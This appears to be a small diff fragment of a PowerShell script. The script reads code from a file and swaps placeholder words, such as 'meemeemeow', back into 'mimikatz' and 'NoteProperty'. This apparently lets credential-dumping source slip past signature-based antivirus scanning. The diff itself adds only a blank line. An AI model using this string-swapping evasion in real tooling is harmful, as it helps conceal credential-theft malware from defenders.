@@ -6,6 +6,7 @@
 # MODIFY CODE FILE PATH AS NEEDED
 
 $strCPath = "clist.txt"
+
 try{$strCode = [io.file]::ReadAllText($strCPath)} catch{} finally{}
 $strCode = $strCode -replace "Nooote", "NoteProperty"
 $strCode = $strCode -replace "meemeemeow", "mimikatz"
